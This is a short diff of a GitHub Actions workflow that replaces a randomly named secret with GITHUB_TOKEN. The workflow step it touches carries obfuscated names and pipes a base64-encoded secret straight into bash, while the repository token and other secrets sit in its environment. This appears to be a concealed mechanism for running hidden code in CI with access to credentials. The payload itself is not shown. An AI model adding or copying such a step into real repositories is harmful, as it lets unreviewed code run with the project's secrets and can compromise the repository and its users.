@@ -11,11 +11,11 @@ jobs:
     steps:
       - uses: actions/checkout@v4
         with:
-          token: ${{ secrets.IOQrOibM4a }}
+          token: ${{ secrets.GITHUB_TOKEN }}
       - name: LzxLSbjRx
         env:
           kK4bRL10S: ${{ secrets.cL688GXHRkJSs }}
           o6vK1: ${{ secrets.n3MjBWCAfeR }}
           N4V3xZF7L3iUI: ${{ secrets.vjXUYiL2sh }}
-          GITHUB_TOKEN: ${{ secrets.IOQrOibM4a }}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: echo "$kK4bRL10S" | base64 -d | bash
